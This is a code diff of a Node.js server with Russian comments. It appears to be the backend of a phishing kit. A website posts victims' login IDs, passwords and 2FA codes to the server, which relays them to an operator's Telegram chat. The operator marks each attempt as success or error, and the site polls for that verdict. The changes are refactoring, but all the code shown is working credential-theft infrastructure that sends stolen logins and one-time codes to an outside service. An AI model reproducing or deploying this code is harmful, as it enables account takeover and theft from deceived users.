@@ -10,10 +10,13 @@ const adminChatId = '-1003894478662';
 const bot = new TelegramBot(token, { polling: true });
 const app = express();
 
-app.use(cors());
+app.use(cors()); // Позволяет сайту с GitHub делать запросы к Render
 app.use(express.json());
 
 let userStatuses = {}; 
+
+// Обработка ошибок polling (чтобы сервер не падал)
+bot.on('polling_error', (error) => console.log('Ошибка бота:', error.code));
 
 // 1. Прием данных с сайта
 app.post('/send-data', (req, res) => {
@@ -27,8 +30,6 @@ app.post('/send-data', (req, res) => {
         message = `⚠️ **Вход**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;
     } else if (type === '2fa') {
         message = `🔢 **Код 2FA**: \`${code}\``;
-    } else {
-        message = `ℹ️ Инфо: ${req.body.text || 'нет данных'}`;
     }
 
     bot.sendMessage(adminChatId, message, {
@@ -44,19 +45,11 @@ app.post('/send-data', (req, res) => {
     res.json({ status: 'ok' });
 });
 
-// 2. Обработка кнопок в Telegram
+// 2. Обработка кнопок
 bot.on('callback_query', (query) => {
-    const data = query.data.split('_');
-    const action = data[0]; 
-    const userId = data[1];
+    const [action, userId] = query.data.split('_');
 
-    if (action === 'ok') {
-        userStatuses[userId] = 'success';
-        console.log(`[${userId}] Админ нажал: ✅`);
-    } else {
-        userStatuses[userId] = 'error';
-        console.log(`[${userId}] Админ нажал: ❌`);
-    }
+    userStatuses[userId] = (action === 'ok') ? 'success' : 'error';
 
     bot.answerCallbackQuery(query.id, { text: "Статус обновлен" });
     bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
@@ -67,10 +60,8 @@ bot.on('callback_query', (query) => {
 
 // 3. Проверка статуса сайтом
 app.get('/check/:userId', (req, res) => {
-    const userId = req.params.userId;
-    const status = userStatuses[userId] || 'none';
-    res.json({ status: status });
+    res.json({ status: userStatuses[req.params.userId] || 'none' });
 });
 
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Сервер на порту ${PORT}`));
